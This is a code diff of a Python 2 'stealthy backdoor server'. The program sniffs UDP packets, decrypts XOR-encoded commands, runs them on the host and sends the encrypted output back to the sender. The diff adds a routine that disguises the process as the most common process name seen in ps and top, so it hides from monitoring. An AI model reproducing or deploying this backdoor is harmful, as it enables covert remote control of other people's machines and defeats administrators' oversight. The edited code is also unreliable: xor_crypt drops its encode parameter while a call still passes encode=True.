@@ -1,5 +1,5 @@
-############################################################################################################
-##	SOURCE FILE:		final_backdoor.py - A stealthy backdoor server that can execute remote commands
+# ###########################################################################################################
+# #	SOURCE FILE:		final_backdoor.py - A stealthy backdoor server that can execute remote commands
 ##
 ##	PROGRAM:		    backdoor
 ##
@@ -24,7 +24,7 @@
 
 import setproctitle
 import sys
-from scapy.all import*
+from scapy.all import *
 import time
 import os
 from itertools import izip, cycle
@@ -42,7 +42,6 @@ FILTER = "udp and src port {0} and dst port {1}".format(SPORT, DPORT)
 # Must make sure it is the same as the client
 ENCRYPTION_KEY = "zdehjk"
 ######################################################################
-
 
 
 ######################################################################
@@ -70,11 +69,8 @@ ENCRYPTION_KEY = "zdehjk"
 ##          specified in the call.
 ##
 ######################################################################
-def xor_crypt(data, ENCRYPTION_KEY=ENCRYPTION_KEY, encode=False, decode=False):
-    if decode:
-        message = ''.join(chr(ord(c)^ord(k)) for c,k in izip(data, cycle(ENCRYPTION_KEY)))
-    if encode:
-        message = ''.join(chr(ord(c)^ord(k)) for c,k in izip(data, cycle(ENCRYPTION_KEY)))
+def xor_crypt(data, ENCRYPTION_KEY=ENCRYPTION_KEY):
+    message = ''.join(chr(ord(c) ^ ord(k)) for c, k in izip(data, cycle(ENCRYPTION_KEY)))
     return message
 
 ######################################################################
@@ -104,9 +100,11 @@ def remoteExecute(packet):
 
     dest_ip = packet[0][1].src
     print "Sending encrypted response.."
-    send(IP(dst=dest_ip)/UDP(sport=DPORT, dport=SPORT)/xor_crypt(command_result, encode=True))
+    send(IP(dst=dest_ip) / UDP(sport=DPORT, dport=SPORT) / xor_crypt(command_result, encode=True))
 
     return "Packet Arrived" + ": " + packet[0][1].src + "==>" + packet[0][1].dst
+
+
 ######################################################################
 ##	FUNCTION:	    set_proc_name
 ##
@@ -128,23 +126,54 @@ def remoteExecute(packet):
 ######################################################################
 def set_proc_name(newname):
     from ctypes import cdll, byref, create_string_buffer
+
     libc = cdll.LoadLibrary('libc.so.6')
-    buff = create_string_buffer(len(newname)+1)
+    buff = create_string_buffer(len(newname) + 1)
     buff.value = newname
     libc.prctl(15, byref(buff), 0, 0, 0)
+
+######################################################################
+##	FUNCTION:	    set_proc_name
+##
+##	INTERFACE:	   set_proc_name(newname)
+##
+##				    newname:   The name to change the process name that top sees.
+##
+##	RETURNS:        Nothing
+##
+##	LAST MODIFIED:  October 15, 2014
+##
+##	DESIGNERS:	    Zach Smoroden & Slade Solobay
+##
+##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
+##
+##	NOTES:
+##	        This will only mask the proccess when looking at top. ps and htop require a different method.
+##
+######################################################################
+def mask_process():
+    # Gets the most common process name for ps -aux/htop
+    command = os.popen("ps -aux | awk '{ print $11 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
+    command_result = command.read()
+    print "The most common process for ps/htop is: {0} \n".format(command_result)
+
+    # Masks the process for ps -aux and htop.
+    setproctitle.setproctitle(command_result)
+
+    # Gets the most common process name from top
+    command = os.popen("top -bn1 | awk '{ print $12 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
+    command_result = command.read()
+
+    # Masks the process for top
+    set_proc_name(command_result)
+    print "The most common process for top is: {0} \n".format(command_result)
 
 ###### START OF SCRIPT #######
 # To show the user what it is listening for.
 print FILTER
 
-# Gets the most common process name for ps -aux/htop
-command = os.popen("ps -aux | awk '{ print $11 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
-command_result = command.read()
-print "The most common process for ps/htop is: {0} \n".format(command_result)
-
-# Masks the process.
-setproctitle.setproctitle('test1')
-set_proc_name('test2')
+# Mask the processes.
+mask_process()
 
 # Start sniffing for packets
 sniff(filter=FILTER, prn=remoteExecute)
